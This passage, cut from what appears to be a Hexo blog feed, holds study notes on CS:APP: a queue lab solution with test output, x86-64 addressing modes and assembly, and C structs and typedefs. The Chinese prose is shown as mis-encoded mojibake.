class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief Returns the number of elements in a queue</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This function runs in O(1) time.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * @param[in] q The queue to examine</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * @return the number of elements in the queue, or</span><br><span class="hljs-comment"> *         0 if q is NULL or empty</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">size_t</span> <span class="hljs-title">queue_size</span><span class="hljs-params">(<span class="hljs-keyword">queue_t</span> *q)</span> </span>&#123;<br>    <span class="hljs-comment">/* You need to write the code for this function */</span><br>    <span class="hljs-comment">/* Remember: It should operate in O(1) time */</span><br>    <span class="hljs-keyword">if</span> (q != <span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">return</span> (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)q-&gt;size;<br>    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)<span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="queue-reverse"><a href="#queue-reverse" class="headerlink" title="queue_reverse"></a>queue_reverse</h1></li><li>ä½¿ç”¨ä¸‰ä¸ªæŒ‡é’ˆï¼ŒpreæŒ‡é’ˆå’ŒiteræŒ‡é’ˆç”¨æ¥æ”¹å˜èŠ‚ç‚¹çš„æŒ‡å‘ï¼ŒnextæŒ‡é’ˆä¸€ç›´å¾€åç§»åŠ¨ä¸”è¯•æ¢æ˜¯å¦ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ä¸ºnull</li><li>ç»¿è‰²ä¸ºè¢«æ”¹å˜çš„èŠ‚ç‚¹æŒ‡é’ˆçš„æŒ‡å‘</li><li>çº¢è‰²è¡¨ç¤ºæ¯æ¬¡å¾ªç¯è¿™ä¸‰ä¸ªæŒ‡é’ˆéƒ½è¦å¾€åæŒ‡</li><li>æœ€åï¼Œé˜Ÿåˆ—çš„é¦–ä½æŒ‡é’ˆè¦è°ƒæ¢</li></ul><p><img src="/image/csapp/Snipaste_2022-08-31_21-37-25.png"></p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief Reverse the elements in a queue</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This function does not allocate or free any list elements, i.e. it does</span><br><span class="hljs-comment"> * not call malloc or free, including inside helper functions. Instead, it</span><br><span class="hljs-comment"> * rearranges the existing elements of the queue.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * @param[in] q The queue to reverse</span><br><span class="hljs-comment"> */</span><br>void queue_reverse(queue_t *q) &#123;<br>    <span class="hljs-function"><span class="hljs-title">if</span> (q == NULL || q-&gt;</span>head == NULL) &#123;<br>        return;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-title">list_ele_t</span> *iter = q-&gt;</span>head;<br>    <span class="hljs-function"><span class="hljs-title">list_ele_t</span> *next = q-&gt;</span><span class="hljs-function"><span class="hljs-title">head</span>-&gt;</span>next;<br>    list_ele_t *prev = NULL;<br>    <span class="hljs-keyword">while</span> (next) &#123;<br>        <span class="hljs-function"><span class="hljs-title">iter</span>-&gt;</span>next = prev;<br>        prev = iter;<br>        iter = next;<br>        <span class="hljs-function"><span class="hljs-title">next</span> = next-&gt;</span>next;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-title">iter</span>-&gt;</span>next = prev;<br>    <span class="hljs-function"><span class="hljs-title">q</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">tail</span> = q-&gt;</span>head;<br>    <span class="hljs-function"><span class="hljs-title">q</span>-&gt;</span>head = iter;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="æµ‹è¯„"><a href="#æµ‹è¯„" class="headerlink" title="æµ‹è¯„"></a>æµ‹è¯„</h1><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-built_in">make</span> clean<br><br><span class="hljs-built_in">make</span> <span class="hljs-keyword">format</span><br><br>./driver.py<br><br></code></pre></td></tr></table></figure><p>ç»“æœ</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">...</span><span class="hljs-params">(ç•¥)</span><br><br>+++ TESTING trace trace-15-perf:<br><span class="hljs-string">./qtest</span> -v 1 -f <span class="hljs-string">./traces/trace-15-perf.cmd</span><br><span class="hljs-comment"># Test performance of insert_tail, size, and reverse</span><br><span class="hljs-params">---</span>     trace-15-perf   7/7<br><span class="hljs-params">---</span>     TOTAL           100/100<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CSAPPï¼šç¨‹åºçš„æœºå™¨çº§è¡¨ç¤º-2</title>
    <link href="/p/de374fbf/"/>
    <url>/p/de374fbf/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¨‹åºå‘˜è§†è§’"><a href="#ç¨‹åºå‘˜è§†è§’" class="headerlink" title="ç¨‹åºå‘˜è§†è§’"></a>ç¨‹åºå‘˜è§†è§’</h1><ul><li>ç¨‹åºè®¡æ•°å™¨(Program counterï¼ŒPC )<ul><li>CSï¼šIP</li><li>EIP</li><li>RIP</li></ul></li><li>å¯„å­˜å™¨ï¼ˆRegisterï¼‰</li><li>æ¡ä»¶ç (Condition codes)<ul><li>å­˜å‚¨æœ€è¿‘çš„ç®—æœ¯æˆ–é€»è¾‘è¿ç®—çš„çŠ¶æ€ä¿¡æ¯</li><li>ç”¨äºæ¡ä»¶åˆ†æ”¯</li></ul></li><li>å†…å­˜(Memory)<ul><li>å¯æŒ‰å­—èŠ‚å¯»å€çš„æ•°ç»„ï¼ˆå†…å­˜å°±æ˜¯ä¸ªå¤§æ•°ç»„ï¼‰</li><li>ç¨‹åºå’Œæ•°æ®</li><li>æ ˆ(Stackï¼Œç”¨äºå‡½æ•°è°ƒç”¨è¿‡ç¨‹çš„å®ç°)</li></ul></li></ul><h1 id="å‡ ç§å¸¸è§çš„å¯»å€æ–¹å¼"><a href="#å‡ ç§å¸¸è§çš„å¯»å€æ–¹å¼" class="headerlink" title="å‡ ç§å¸¸è§çš„å¯»å€æ–¹å¼"></a>å‡ ç§å¸¸è§çš„å¯»å€æ–¹å¼</h1><h2 id="å¯„å­˜å™¨é—´æ¥å¯»å€"><a href="#å¯„å­˜å™¨é—´æ¥å¯»å€" class="headerlink" title="å¯„å­˜å™¨é—´æ¥å¯»å€"></a>å¯„å­˜å™¨é—´æ¥å¯»å€</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs log">movq (%rcx),%rax<br></code></pre></td></tr></table></figure><p>å¯„å­˜å™¨RæŒ‡å®šå†…å­˜åœ°å€</p><ul><li>Mem[Reg[R]]</li><li>(%rax)</li></ul><h2 id="ç›¸å¯¹å¯»å€"><a href="#ç›¸å¯¹å¯»å€" class="headerlink" title="ç›¸å¯¹å¯»å€"></a>ç›¸å¯¹å¯»å€</h2><figure class="highlight arm"><figcaption><span>Assembly</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ARM"><span class="hljs-symbol">movq</span> <span class="hljs-number">8</span>(%rbp),%rdx<br></code></pre></td></tr></table></figure><ul><li>å¯„å­˜å™¨RæŒ‡å®šå†…å­˜åŒºåŸŸçš„å¼€å§‹åœ°å€ï¼Œéœ€é…åˆåç§»åœ°å€</li><li>å½¢å¼ï¼šD(R) å«ä¹‰ï¼šMem[Reg[R]+D]  Dä¸º1/2/4/8</li></ul><h2 id="å®Œæ•´çš„å†…å­˜å¯»å€æ¨¡å¼"><a href="#å®Œæ•´çš„å†…å­˜å¯»å€æ¨¡å¼" class="headerlink" title="å®Œæ•´çš„å†…å­˜å¯»å€æ¨¡å¼"></a>å®Œæ•´çš„å†…å­˜å¯»å€æ¨¡å¼</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs log">Mem[Reg[Rb]+S*Reg[Ri]]<br></code></pre></td></tr></table></figure><ul><li>D(Rb,Ri,S) </li><li>Mem[Reg[Rb]+S*Reg[Ri]+ D]</li></ul><blockquote><p>(Rb,Ri)    Mem[Reg[Rb]+Reg[Ri]]<br>        D(Rb,Ri)    Mem[Reg[Rb]+Reg[Ri]+D]<br>        (Rb,Ri,S)    Mem[Reg[Rb]+S*Reg[Ri]]</p></blockquote><h1 id="movå¯¹åº”çš„Cè¯­è¨€è¯­å¥"><a href="#movå¯¹åº”çš„Cè¯­è¨€è¯­å¥" class="headerlink" title="movå¯¹åº”çš„Cè¯­è¨€è¯­å¥"></a>movå¯¹åº”çš„Cè¯­è¨€è¯­å¥</h1><p>movq $0x4,%rax </p><ul><li>temp = 0x4;</li></ul><p>movq $-147,  (%rax)</p><ul><li>*p = -147;</li></ul><p>movq %rax,   %rdx</p><ul><li>temp2 = temp1</li></ul><p>movq %rax,   (%rdx)</p><ul><li>*p = temp;</li></ul><p>movq (%rax), %rdx</p><ul><li>temp = *p;</li></ul><h1 id="swapå‡½æ•°"><a href="#swapå‡½æ•°" class="headerlink" title="swapå‡½æ•°"></a>swapå‡½æ•°</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">swap</span></span><br><span class="hljs-function">   <span class="hljs-params">(<span class="hljs-keyword">long</span> *xp, <span class="hljs-keyword">long</span> *yp)</span> </span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">long</span> t0 = *xp;<br>  <span class="hljs-keyword">long</span> t1 = *yp;<br>  *xp = t1;<br>  *yp = t0;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯¹åº”æ±‡ç¼–ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs log">swap:<br>   movq    (%rdi), %rax  # t0 = *xp  <br>   movq    (%rsi), %rdx  # t1 = *yp<br>   movq    %rdx, (%rdi)  # *xp = t1<br>   movq    %rax, (%rsi)  # *yp = t0<br>   ret<br></code></pre></td></tr></table></figure><h1 id="Cè¯­è¨€ç¨‹åºä¸æ±‡ç¼–çš„è½¬æ¢"><a href="#Cè¯­è¨€ç¨‹åºä¸æ±‡ç¼–çš„è½¬æ¢" class="headerlink" title="Cè¯­è¨€ç¨‹åºä¸æ±‡ç¼–çš„è½¬æ¢"></a>Cè¯­è¨€ç¨‹åºä¸æ±‡ç¼–çš„è½¬æ¢</h1><p>Cè¯­è¨€ç¨‹åºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">long</span> <span class="hljs-title">plus</span><span class="hljs-params">(<span class="hljs-keyword">long</span> x, <span class="hljs-keyword">long</span> y)</span></span>; <br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sumstore</span><span class="hljs-params">(<span class="hljs-keyword">long</span> x, <span class="hljs-keyword">long</span> y, </span></span><br><span class="hljs-params"><span class="hljs-function">                          <span class="hljs-keyword">long</span> *dest)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">long</span> t = plus(x, y);<br>    *dest = t;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">gcc â€“Og â€“S sum.c<br></code></pre></td></tr></table></figure><p>ç”Ÿæˆçš„æ±‡ç¼–ï¼š</p><figure class="highlight mips"><figcaption><span>Assembly</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs MIPS">        .file   <span class="hljs-string">&quot;fk.c&quot;</span><br>        <span class="hljs-meta">.text</span><br>        .globl  sumstore<br>        .type   sumstore, @function<br><span class="hljs-symbol">sumstore:</span><br><span class="hljs-symbol">.LFB0:</span><br>        .cfi_startproc<br>        endbr64<br>        pushq   %rbx<br>        .cfi_def_cfa_offset <span class="hljs-number">16</span><br>        .cfi_offset <span class="hljs-number">3</span>, -<span class="hljs-number">16</span><br>        movq    %rdx, %rbx<br>        call    plus@PLT<br>        movq    %rax, (%rbx)<br>        popq    %rbx<br>        .cfi_def_cfa_offset <span class="hljs-number">8</span><br>        ret<br>        .cfi_endproc<br><span class="hljs-symbol">.LFE0:</span><br>        .size   sumstore, .-sumstore<br>        .ident  <span class="hljs-string">&quot;GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0&quot;</span><br>        <span class="hljs-meta">.section</span>        .note.GNU-stack,<span class="hljs-string">&quot;&quot;</span>,@progbits<br>        <span class="hljs-meta">.section</span>        .note.gnu.property,<span class="hljs-string">&quot;a&quot;</span><br>        <span class="hljs-meta">.align</span> <span class="hljs-number">8</span><br>        <span class="hljs-meta">.long</span>    <span class="hljs-number">1</span>f - <span class="hljs-number">0</span>f<br>        <span class="hljs-meta">.long</span>    <span class="hljs-number">4</span>f - <span class="hljs-number">1</span>f<br>        <span class="hljs-meta">.long</span>    <span class="hljs-number">5</span><br><span class="hljs-number">0</span>:<br>        .string  <span class="hljs-string">&quot;GNU&quot;</span><br><span class="hljs-number">1</span>:<br>        <span class="hljs-meta">.align</span> <span class="hljs-number">8</span><br>        <span class="hljs-meta">.long</span>    <span class="hljs-number">0xc0000002</span><br>        <span class="hljs-meta">.long</span>    <span class="hljs-number">3</span>f - <span class="hljs-number">2</span>f<br><span class="hljs-number">2</span>:<br>        <span class="hljs-meta">.long</span>    <span class="hljs-number">0x3</span><br><span class="hljs-number">3</span>:<br>        <span class="hljs-meta">.align</span> <span class="hljs-number">8</span><br><span class="hljs-number">4</span>:<br></code></pre></td></tr></table></figure><p>ç²¾ç®€ä¸€ä¸‹ï¼š</p><figure class="highlight mips"><figcaption><span>Assembly</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs MIPS"><span class="hljs-symbol">sumstore:</span><br>   pushq   %rbx<br>   movq    %rdx, %rbx<br>   call    plus<br>   movq    %rax, (%rbx)<br>   popq    %rbx<br>   ret<br></code></pre></td></tr></table></figure><p>å¯ä»¥ä½¿ç”¨<code>objdump</code>å¯¹äºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡Œåæ±‡ç¼–</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs gams">objdump<br><br>View information about object <span class="hljs-keyword">files</span>.<br>More information: https:<span class="hljs-comment">//manned.org/objdump.</span><br><br>- <span class="hljs-keyword">Display</span> the <span class="hljs-keyword">file</span> header information:<br>  objdump -f <span class="hljs-keyword">binary</span><br><br>- <span class="hljs-keyword">Display</span> the dis-assembled output of executable sections:<br>  objdump -d <span class="hljs-keyword">binary</span><br><br>- <span class="hljs-keyword">Display</span> a complete <span class="hljs-keyword">binary</span> hex dump of <span class="hljs-keyword">all</span> sections:<br>  objdump -s <span class="hljs-keyword">binary</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ“ä½œç³»ç»Ÿï¼Œcsapp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Cè¯­è¨€ï¼šç»“æ„ä½“</title>
    <link href="/p/8cf2e09a/"/>
    <url>/p/8cf2e09a/</url>
    
    <content type="html"><![CDATA[<h1 id="å®šä¹‰"><a href="#å®šä¹‰" class="headerlink" title="å®šä¹‰"></a>å®šä¹‰</h1><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs smali">struct point&#123;<br> <span class="hljs-built_in"> int </span>x;<br> <span class="hljs-built_in"> int </span>y;<br>&#125;p1,p2;<br><br>struct point p3;<br></code></pre></td></tr></table></figure><ul><li>struct åè·Ÿçš„pointç§°ä¸ºç»“æ„æ ‡è®°ï¼Œè¿™ç§æ ‡è¯†ç¬¦åœ¨Cè¯­è¨€ä¸­ç§°ä¸ºTag</li><li>structå£°æ˜å®šä¹‰äº†ä¸€ç§æ•°æ®ç±»å‹ï¼Œå¯ä»¥å°†è‡ªå®šä¹‰çš„æ ‡è¯†ç¬¦å£°æ˜ä¸ºæŒ‡å®šç±»å‹çš„å˜é‡ï¼Œè¿™é‡Œp1,p2éƒ½æ˜¯pointç±»å‹</li><li>å¦‚æœåœ¨å®šä¹‰ç»“æ„ä½“ç±»å‹çš„åŒæ—¶å®šä¹‰äº†å˜é‡ï¼Œä¹Ÿå¯ä»¥ä¸å¿…å†™Tagï¼Œä½†è¿™æ ·å°±æ²¡æœ‰åŠæ³•å†æ¬¡å¼•ç”¨è¿™ä¸ªç»“æ„ä½“ç±»å‹ï¼ˆæ²¡æœ‰tagï¼‰</li></ul><h1 id="æˆå‘˜è®¿é—®ä¸å¼•ç”¨"><a href="#æˆå‘˜è®¿é—®ä¸å¼•ç”¨" class="headerlink" title="æˆå‘˜è®¿é—®ä¸å¼•ç”¨"></a>æˆå‘˜è®¿é—®ä¸å¼•ç”¨</h1><p>é€šè¿‡<code>.</code>è¿›è¡Œç»“æ„ä½“çš„å¼•ç”¨</p><ul><li><code>struct point maxpt = &#123;320, 200&#125;;</code>ï¼Œé‚£ä¹ˆmaxpt.xå¯ä»¥è®¿é—®maxptçš„xæˆå‘˜ï¼Œè‹¥æœ‰ç»“æ„ä½“å†…éƒ¨çš„åµŒå¥—å…³ç³»ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨<code>.</code>è®¿é—®è¢«åµŒå¥—çš„æˆå‘˜<br>é€šè¿‡<code>-&gt;</code>è¿›è¡Œå¼•ç”¨</li><li><code>struct point origin,*pp;</code> å°† pp å®šä¹‰ä¸ºä¸€ä¸ªæŒ‡å‘ struct point ç±»å‹å¯¹è±¡çš„æŒ‡é’ˆ</li><li>pp = &amp;originï¼Œè¯¥æŒ‡é’ˆæŒ‡å‘originç»“æ„ä½“ï¼Œç„¶åå°±å¯ä»¥ç”¨<code>(*pp).x, (*pp).y</code>æ¥è®¿é—®ç»“æ„ä½“çš„å˜é‡</li><li><code>(*pp).x</code> ä¸­çš„åœ†æ‹¬å·æ˜¯å¿…éœ€çš„ï¼Œå› ä¸ºç»“æ„æˆå‘˜è¿ç®—ç¬¦<code>.</code>çš„ä¼˜å…ˆçº§æ¯”<code>*</code>çš„ä¼˜å…ˆçº§é«˜ã€‚è¡¨è¾¾å¼<code>*pp.x</code> çš„å«ä¹‰ç­‰ä»·äº*(pp.x)ï¼Œå› ä¸º x ä¸æ˜¯æŒ‡é’ˆï¼Œæ‰€ä»¥è¯¥è¡¨è¾¾å¼æ˜¯éæ³•çš„</li></ul><p>C è¯­è¨€æä¾›äº†å¦ä¸€ç§ç®€å†™æ–¹å¼ï¼Œå‡å®š p æ˜¯ä¸€ä¸ªæŒ‡å‘ç»“æ„çš„æŒ‡é’ˆï¼Œå¯ä»¥ç”¨p-&gt;ç»“æ„æˆå‘˜è¿™ç§å½¢å¼å¼•ç”¨ç›¸åº”çš„ç»“æ„æˆå‘˜</p><p>å‡è®¾æœ‰ä¸€ä¸ªç»“æ„ä½“å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_ele</span> &#123;</span><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * @brief Pointer to a char array containing a string value.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * The memory for this string should be explicitly allocated and freed</span><br><span class="hljs-comment">     * whenever an element is inserted and removed from the queue.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">char</span> *value;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * @brief Pointer to the next element in the linked list.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_ele</span> *<span class="hljs-title">next</span>;</span><br>&#125; <span class="hljs-keyword">list_ele_t</span>;<br></code></pre></td></tr></table></figure><ul><li><p><code> list_ele_t *newh = (list_ele_t *)malloc(sizeof(list_ele_t));</code>åˆ†é…äº†ç»“æ„ä½“çš„ç©ºé—´ã€‚ä½†æ˜¯è¿™æ ·ä¸ä¼šç»™valueåˆ†é…ç©ºé—´</p></li><li><p><code> newh-&gt;value = (char *)malloc(sizeof(char) * (strlen(s) + 1));</code>ç»™ç»“æ„ä½“å†…çš„valueåˆ†é…äº†ç©ºé—´ï¼Œè¿™æ ·ä¹‹åæ‰å¯ä»¥å¯¹valueè¿›è¡Œæ“ä½œ</p></li></ul><h1 id="èµ‹å€¼"><a href="#èµ‹å€¼" class="headerlink" title="èµ‹å€¼"></a>èµ‹å€¼</h1><ul><li>ç»“æ„ä½“ç±»å‹ä¹‹é—´ç”¨èµ‹å€¼è¿ç®—ç¬¦æ˜¯å…è®¸çš„</li><li>ç”¨ä¸€ä¸ªç»“æ„ä½“åˆå§‹åŒ–å¦ä¸€ä¸ªç»“æ„ä½“ä¹Ÿæ˜¯å…è®¸çš„</li><li>å°†ç»“æ„ä½“ä½œä¸ºå‡½æ•°å‚æ•°ã€å‡½æ•°è¿”å›å€¼æ˜¯å…è®¸çš„</li></ul><p>ä¸€ä¸ªå‡½æ•°è°ƒç”¨åˆ†æ</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">struct</span> complex_struct <span class="hljs-title">add_complex</span>(<span class="hljs-params"><span class="hljs-keyword">struct</span> complex_struct z1, <span class="hljs-keyword">struct</span></span></span><br><span class="hljs-params"><span class="hljs-function">complex_struct z2</span>)</span><br>&#123;<br>  z1.x = z1.x + z2.x;<br>  z1.y = z1.y + z2.y;<br>  <span class="hljs-keyword">return</span> z1;<br>&#125;<br><br><span class="hljs-keyword">struct</span> complex_struct z = &#123; <span class="hljs-number">3.0</span>, <span class="hljs-number">4.0</span> &#125;;<br>z = add_complex(z, z);<br></code></pre></td></tr></table></figure><p>å˜é‡zåœ¨mainå‡½æ•°çš„æ ˆå¸§ä¸­ï¼Œå‚æ•°z1å’Œz2åœ¨add_complexå‡½æ•°çš„æ ˆå¸§ä¸­ï¼Œzçš„å€¼åˆ†åˆ«èµ‹ç»™z1å’Œz2</p><p>å¦‚æœç»“æ„ä½“ä¸­æœ‰charç±»å‹çš„æ•°ç»„ï¼Œå¯ä»¥ä½¿ç”¨strcpyå‡½æ•°è¿›è¡Œèµ‹å€¼</p><h1 id="ç±»å‹å®šä¹‰"><a href="#ç±»å‹å®šä¹‰" class="headerlink" title="ç±»å‹å®šä¹‰"></a>ç±»å‹å®šä¹‰</h1><p>typedefå¯ä»¥å»ºç«‹æ–°çš„æ•°æ®ç±»å‹åï¼Œä¾‹å¦‚ï¼Œ<code>typedef int Length;</code>å°† Length å®šä¹‰ä¸ºä¸ int å…·æœ‰åŒç­‰æ„ä¹‰çš„åå­—</p><p>æ¯”è¾ƒå¤æ‚çš„ç±»å‹å®šä¹‰:</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi">typedef int <span class="hljs-comment">(*PFI)(char *, char *)</span>;<br></code></pre></td></tr></table></figure><p>è¯¥è¯­å¥å®šä¹‰äº†ç±»å‹ PFI æ˜¯â€œä¸€ä¸ªæŒ‡å‘å‡½æ•°çš„æŒ‡é’ˆï¼Œè¯¥å‡½æ•°å…·æœ‰ä¸¤ä¸ª char *ç±»å‹çš„å‚æ•°ï¼Œè¿”å›å€¼ç±»å‹ä¸º intâ€</p><p>typedefæœ‰åŠ©äºåˆ†æå‡½æ•°å£°æ˜ï¼Œæ¯”å¦‚ä¸‹é¢çš„å£°æ˜ï¼Œå¯ä»¥æš´åŠ›åˆ†æï¼š</p><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs qml"><span class="hljs-keyword">void</span> (*<span class="hljs-keyword">signal</span><span class="hljs-string"></span>(<span class="hljs-built_in">int</span> sig, <span class="hljs-keyword">void</span> (*func)(<span class="hljs-built_in">int</span>)))(<span class="hljs-built_in">int</span>);<br></code></pre></td></tr></table></figure><ul><li>ç®€åŒ–å£°æ˜<ul><li><code>void (*signal(int sig, func))(int);</code></li><li><code>void (*)(int);</code></li></ul></li><li>signal æ˜¯ä¸€ä¸ªå‡½æ•°<ul><li>æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªä¸ºintç±»å‹ï¼Œä¸€ä¸ªä¸ºæŒ‡å‘å‡½æ•°çš„æŒ‡é’ˆ</li><li>è¿”å›å€¼ä¸ºæŒ‡å‘å‡½æ•°çš„æŒ‡é’ˆï¼ˆå‚æ•°ä¸ºintï¼Œè¿”å›å€¼ä¸ºvoidï¼‰</li></ul></li></ul><p>ä¹Ÿå¯ä»¥è¿™æ ·åˆ†æï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">void</span> <span class="hljs-params">(*<span class="hljs-keyword">sighandler_t</span>)</span><span class="hljs-params">(<span class="hljs-keyword">int</span>)</span></span>; <br><span class="hljs-function"><span class="hljs-keyword">sighandler_t</span> <span class="hljs-title">signal</span><span class="hljs-params">(<span class="hljs-keyword">int</span> signum, <span class="hljs-keyword">sighandler_t</span> handler)</span></span>; <br></code></pre></td></tr></table></figure><h1 id="ç»“æ„ä½“æ’åºçš„å‡ ç§æ–¹æ³•"><a href="#ç»“æ„ä½“æ’åºçš„å‡ ç§æ–¹æ³•" class="headerlink" title="ç»“æ„ä½“æ’åºçš„å‡ 